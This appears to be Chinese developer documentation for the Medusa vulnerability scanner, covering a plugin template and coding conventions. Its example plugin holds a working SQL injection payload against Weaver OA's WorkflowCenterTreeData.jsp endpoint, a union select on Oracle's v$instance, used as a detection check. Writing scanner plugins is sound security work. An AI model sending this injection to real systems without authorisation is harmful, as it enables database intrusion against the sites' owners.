## 插件模板

以最新的```泛微OA```插件作为例子

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
注意！只能对oracle数据库起作用
'''
__author__ = 'Ascotbe'
__times__ = '2019/10/13 22:12 PM'
import urllib
import requests
import re
class VulnerabilityInfo(object):
    def __init__(self):
        self.info = {}
        self.info['author'] = "Ascotbe"  # 插件作者
        self.info['CreateDate'] = "2019-10-13"  # 插件编辑时间
        self.info['algroup'] = "Weaver_WorkflowCenterTreeDataInterfaceInjectionVulnerability"  # 漏洞名称
        self.info['affects'] = "泛微OA"  # 漏洞组件
        self.info['desc_content'] = "泛微OA_WorkflowCenterTreeData接口注入漏洞"  # 漏洞描述

def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global resp
    global resp2
    try:
        payload = "/mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&scope=2333"
        payload_url = scheme + "://" + url + payload


        headers = {
            'User-Agent': RandomAgent,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        }

        s = requests.session()
        if ProxyIp!=None:
            proxies = {
                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                "http": "http://" + str(ProxyIp)
            }
            resp = s.post(payload_url,
                          data={'formids': '11111111111)))' + '\x0a\x0d' * 360 + 'union select NULL,instance_name from '
                                                                                 'v$instance order by (((1'},
                          headers=headers, timeout=6, proxies=proxies,verify=False)
        elif ProxyIp==None:
            resp = s.post(payload_url,
                         data={'formids': '11111111111)))' + '\x0a\x0d' * 360 + 'union select NULL,instance_name from '
                                                                                'v$instance order by (((1'},
                         headers=headers, timeout=6, verify=False)
        con = resp.text
        code = resp.status_code
        if code == 200 and con.lower().find('''"draggable":''') != -1 and con.lower().find(
                '''"checked":''') != -1 and con.lower().find('''"id":''') != -1 and con.lower().find(
                '''"text":''') != -1:
            Medusa = "{} 存在泛微OA WorkflowCenterTreeData接口注入漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
            return (Medusa)
    except Exception:
        logging.warning(Url)#漏洞的请求url
        _ = VulnerabilityInfo()
        logging.warning(_.info.get('parameter'))#捕获的插件名称
        
```

### VulnerabilityInfo函数

```python
class VulnerabilityInfo(object):
    def __init__(self):
        self.info = {}
        self.info['Author'] = "Ascotbe"  # 插件作者
        self.info['CreateDate'] = "2019-10-13"  # 插件编辑时间
        self.info['VName'] = "XXXXXXXXXXXXXXXXXXXX"  # 漏洞名称
        self.info['Affects'] = "该漏洞存在哪个组件中的哪个版本"  # 漏洞组件
        self.info['DescContent'] = "漏洞详情，比如在哪个位置，有什么危害，什么地方没写好或者没过滤导致的等"  # 漏洞描述

```

| 函数名      | 值           | 备注                                                         |
| :---------- | ------------ | ------------------------------------------------------------ |
| Author      | 插件作者     |                                                              |
| CreateDate  | 插件编辑时间 | 格式为：年-月-日                                             |
| VName       | 漏洞名称     | 要和文件名相同，并且只能英文（所有.都要替换为_               |
| Affects     | 漏洞组件     | 该漏洞存在哪个组件中的哪个版本                               |
| DescContent | 漏洞描述     | 漏洞详情，比如在哪个位置，有什么危害，什么地方没写好或者没过滤导致的等 |

### UrlProcessing函数

对url进行处理

```python
def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port
```

函数对各个部分进行处理，最终我们只需要取得``` scheme``` ,``` port``` , ``` hostname``` 的值返回给调用函数就行

### medusa函数

```python
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global resp
    global resp2
    try:
        payload = ""
        payload_post=''
        payload_url = scheme + "://" + url + payload
        headers = {
            'User-Agent': RandomAgent,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        }

        s = requests.session()
        if ProxyIp!=None:
            proxies = {
                "http": "http://" + str(ProxyIp)
            }
            resp = s.post(payload_url,data=payload_post,headers=headers, timeout=6, proxies=proxies,verify=False)
        elif ProxyIp==None:
            resp = s.post(payload_url,data=payload_post,headers=headers, timeout=6, verify=False)
        con = resp.text
        code = resp.status_code
        if code == 200 and con.lower().find('''唯一存在的字符串''') != -1 :
            Medusa = "{} 存在XXXXX漏洞\r\n漏洞详情:\r\nPayload:{}\r\nPost:{}\r\n".format(url, payload_url,payload_post)
            return (Medusa)
    except Exception:
        logging.warning(Url)#漏洞的请求url
        _ = VulnerabilityInfo()
        logging.warning(_.info.get('parameter'))#捕获的插件名称
```

##### 参数

###### Url

- 扫描器传入的链接

###### RandomAgent

- 扫描器传入的随机或者自定义的User-Agent

###### ProxyIp

- 扫描器出入的代理，默认是关闭的

##### 注意点:

###### 端口

- 函数已经对端口进行处理，当存在特点的端口才需要在```payload_url```中拼接上端口号(例如ActiveMQ的8161端口

###### User-Agent

- 该值必须为扫描器纯在的RandomAgent。
- 只有一种情况可以修改该值，就是该漏洞只能使用特殊的User-Agent头的时候。

###### Medusa

- 该值为漏洞扫描结束的值，需要返回给调用函数

###### ProxyIp

- 必须存在如下的```if```..```elif```判断语句，并且里面的值```resp```需要在前面声明全局使用(例:```global resp```

```python
if ProxyIp!=None:
            proxies = {
                "http": "http://" + str(ProxyIp)
            }
            resp = s.post(payload_url,data=payload_post,headers=headers, timeout=6, proxies=proxies,verify=False)
        elif ProxyIp==None:
            resp = s.post(payload_url,data=payload_post,headers=headers, timeout=6, verify=False)
```

###### 判断漏洞存在

- ```if```判断一定要唯一性，唯一的返回状态码，唯一只在该漏洞存在的字符串正常页面不会存在的，如下所示:

```python
        if code == 200 and con.lower().find('''"draggable":''') != -1 and con.lower().find(
                '''"checked":''') != -1 and con.lower().find('''"id":''') != -1 and con.lower().find(
                '''"text":''') != -1:
            Medusa = "{} 存在泛微OA WorkflowCenterTreeData接口注入漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
            return (Medusa)
```

###### 多个payload

- 当一个漏洞脚本存在多个```payload```的时候使用循环来验证漏洞，但是这个漏洞第一次验证存在后续还能验证出漏洞的时候，需要在前面声明```Medusas=[]```来存放

- ```if```判断不使用```return(Medusa)```语句，而是使用```Medusas.append(str(Medusa))```

- 在后面增加循环

  ```python
  try:
  	for i in Medusas:
  		Medusa=Medusa+i
  	return Medusas
  except:
      pass
  ```

- 整体替换如下:

  ```python
  def medusa(Url,RandomAgent,ProxyIp=None):
  
      scheme, url, port = UrlProcessing(Url)
      if port is None and scheme == 'https':
          port = 443
      elif port is None and scheme == 'http':
          port = 80
      else:
          port = port
      global resp
      global resp2
  	Payloads=['x','xx','xxx','xxxx']
      Medusas=[]
  	for Special in Payloads:
  		try:
  			payload_url = scheme + "://" + url + Special
  			headers = {
  				'Accept-Encoding': 'gzip, deflate',
  				'Accept': '*/*',
  				'User-Agent': RandomAgent,
  			}
  			if ProxyIp != None:
  				...
  			elif ProxyIp == None:
  				...
  			con = resp.text
  			code = resp.status_code
  			if code == 200:
  				Medusa = "{} 存在XXXX漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
  				Medusas.append(str(Medusa))
  		except Exception as e:
              logging.warning(Url)#漏洞的请求url
              _ = VulnerabilityInfo()
              logging.warning(_.info.get('parameter'))#捕获的插件名称
      try:
  		for i in Medusas:
  			Medusa=Medusa+i
  		return Medusas
      except:
          pass
  ```

## 插件代码规范

###### 代码中未使用的Package尽量删除

![1.png](https://github.com/Ascotbe/Random-img/blob/master/docute/1.png?raw=true)

###### 变量命名规范

- 仅限使用```驼峰命名法``` 、```匈牙利命名法```
- 默认使用```驼峰命名法```

###### 判断语句

- 在判断中与```None``` ```False``` ```True```等值判断时，使用```is``` ```not``` ```is not```尽量避免使用```==``` ```!=```

###### Requst使用

- 当使用了```request.session()```时，应该在插件结束时使用```request.close()```来主动关闭连接

  ```python
  import requests
  def Medusa():
      s=requests.session()
      get=s.get("www.ascotbe.com")
      get.close()
  ```

  

###### 禁止使用

- 插件中禁止使用```sys.exit()``` ````os.exit()```这两个函数，会导致主程序结束，如果要结束插件使用```return```即可

###### Https

- 如果请求中包含```HTTPS```，可以使用```verify=False```来关闭SSL证书验证

###### 异常捕获

- 每个函数必须存在```try```...```except```来保证扫描器正常使用

- ```except```必须要有异常捕获返回值

  ```
  except Exception:
      logging.warning(Url)#漏洞的请求url
      _ = VulnerabilityInfo()
      logging.warning(_.info.get('parameter'))#捕获的插件名称
  ```

  

###### 清理工作

- 插件写完后需要清除所有的```pirint()```函数，以及不必要的变量